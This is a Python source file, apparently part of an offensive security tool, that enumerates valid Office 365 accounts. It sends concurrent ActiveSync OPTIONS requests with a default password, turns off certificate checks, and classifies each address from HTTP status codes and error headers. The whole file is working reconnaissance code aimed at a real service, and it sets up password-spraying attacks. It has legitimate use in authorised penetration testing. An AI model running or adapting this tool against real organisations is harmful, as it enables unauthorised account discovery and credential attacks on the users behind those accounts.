#!/usr/bin/env python3

# Based on: https://bitbucket.org/grimhacker/office365userenum/

import sys
import urllib3
import asyncio
import requests
from .helper import Helper
from .colors import text_colors
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Enumerator:
    """ Perform user enumeration using Microsoft Server ActiveSync """

    loop = asyncio.get_event_loop()
    url  = "https://outlook.office365.com/Microsoft-Server-ActiveSync"

    # Valid account storage
    valid_accts = []

    def __init__(self, timeout=25, proxy=None, debug=False):
        self.helper  = Helper()
        self.timeout = timeout
        self.debug   = debug
        self.proxy   = None if not proxy else {
            "http": proxy, "https": proxy
        }

    async def run(self, userlist, domain, password="Password1"):
        """ Asynchronously send HTTP requests """
        futures = [self.loop.run_in_executor(
            None, self.enum, user, domain, password
        ) for user in userlist]

        await asyncio.wait(futures)

    def enum(self, user, domain, password):
        """ Enumerate users on Microsoft using Microsoft Server ActiveSync """
        try:
            email   = self.helper.check_email(user, domain)
            headers = {"MS-ASProtocolVersion": "14.0"}
            auth    = (email, password)
            rsp     = requests.options(self.url, headers=headers, auth=auth, timeout=self.timeout, proxies=self.proxy, verify=False)

            status = rsp.status_code
            if status in [200, 401, 403]:
                sys.stdout.write("[%s%s-%d%s] %s%s\n" % (text_colors.green, "VALID_USER", status, text_colors.reset, email, self.helper.space))
                sys.stdout.flush()
                self.valid_accts.append(user)

            elif status == 404 and rsp.headers.get("X-CasErrorCode") == "UserNotFound":
                sys.stdout.write("[%s%s%s] %s%s\r" % (text_colors.red, "INVALID_USER", text_colors.reset, email, self.helper.space))
                sys.stdout.flush()

            else:
                sys.stdout.write("[%s%s%s] %s%s\r" % (text_colors.yellow, "UNKNOWN", text_colors.reset, email, self.helper.space))
                sys.stdout.flush()

        except Exception as e:
            if self.debug: print("[ERROR] %s" % e)
            pass